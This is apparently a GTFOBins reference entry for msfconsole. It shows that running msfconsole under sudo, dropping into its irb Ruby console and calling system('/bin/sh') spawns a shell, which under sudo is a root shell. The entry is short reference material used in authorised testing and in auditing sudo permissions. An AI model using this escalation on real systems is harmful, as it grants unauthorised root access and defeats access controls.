---
description: This allows to spawn a [`ruby`](/gtfobins/ruby/) interpreter.
functions:
  shell:
    - code: |
        sudo msfconsole
        msf6 > irb
        >> system("/bin/sh")
  sudo:
    - code: |
        sudo msfconsole
        msf6 > irb
        >> system("/bin/sh")
---
